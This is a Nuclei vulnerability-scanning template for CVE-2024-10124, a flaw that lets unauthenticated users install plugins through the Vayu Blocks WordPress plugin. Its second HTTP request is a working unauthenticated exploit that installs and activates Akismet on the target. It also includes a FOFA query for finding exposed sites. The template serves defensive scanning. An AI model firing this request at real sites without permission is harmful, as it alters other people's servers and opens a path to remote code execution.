id: CVE-2024-10124

info:
  name: Vayu Blocks  Gutenberg Blocks for WordPress & WooCommerce <= 1.1.1 - Missing Authorization to Arbitrary Plugin Installation
  author: s4e-io
  severity: critical
  description: |
    The Vayu Blocks Gutenberg Blocks for WordPress & WooCommerce plugin for WordPress is vulnerable to unauthorized arbitrary plugin installation and activation due to a missing capability check on the tp_install() function in all versions up to, and including, 1.1.1. This makes it possible for unauthenticated attackers to install and activate arbitrary plugins which can be leveraged to achieve remote code execution if another vulnerable plugin is installed and activated. This vulnerability was partially patched in version 1.1.1.
  reference:
    - https://github.com/RandomRobbieBF/CVE-2024-10124
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/vayu-blocks/vayu-blocks-gutenberg-blocks-for-wordpress-woocommerce-111-missing-authorization-to-unauthenticated-arbitrary-plugin-installationactivation
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10124
    - https://plugins.trac.wordpress.org/browser/vayu-blocks/trunk/inc/vayu-sites/app.php#L28
    - https://plugins.trac.wordpress.org/browser/vayu-blocks/trunk/inc/vayu-sites/app.php#L46
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10124
    cwe-id: CWE-284
    epss-score: 0.00044
    epss-percentile: 0.12177
  metadata:
    verified: true
    max-request: 2
    vendor: themehunk
    product: vayu_blocks
    framework: wordpress
    fofa-query: body="/wp-content/plugins/vayu-blocks"
  tags: cve,cve2024,wp,wordpress,wp-plugin,missing-authorization

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "/wp-content/plugins/vayu-blocks"
        internal: true

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {
            "params": {
                "plugin": {
                    "akismet": "Akismet Anti-Spam"
                },
                "allPlugins": [
                    {
                        "akismet": "akismet/akismet.php"
                    }
                ],
                "themeSlug": "",
                "proThemePlugin": "",
                "templateType": "free",
                "tmplFreePro": "plugin"
            }
        }

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "text/html")'
          - 'contains(header, "title=\"JSON\"; type=\"application/json\"")'
          - "status_code == 200"
        condition: and
